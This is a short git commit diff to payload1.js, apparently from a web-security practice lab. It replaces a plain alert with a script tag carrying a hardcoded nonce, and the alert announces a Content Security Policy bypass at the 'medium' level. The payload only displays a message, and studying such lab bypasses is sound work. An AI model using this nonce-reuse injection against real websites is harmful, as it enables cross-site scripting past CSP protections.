852d497ac13720d9413b6e87628f0c57c5517050
harshithakona38-ops <harshithakona38@gmail.com>
2026-09-20 19:21:38 +0530

    Update payload1.js

--- payload1.js
+++ payload1.js
@@ -1,1 +1,3 @@
-alert("If you can read this, CSP has been bypassed on the low security level");
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">
+alert("If you can read this, CSP has been bypassed on the medium security level")
+</script>
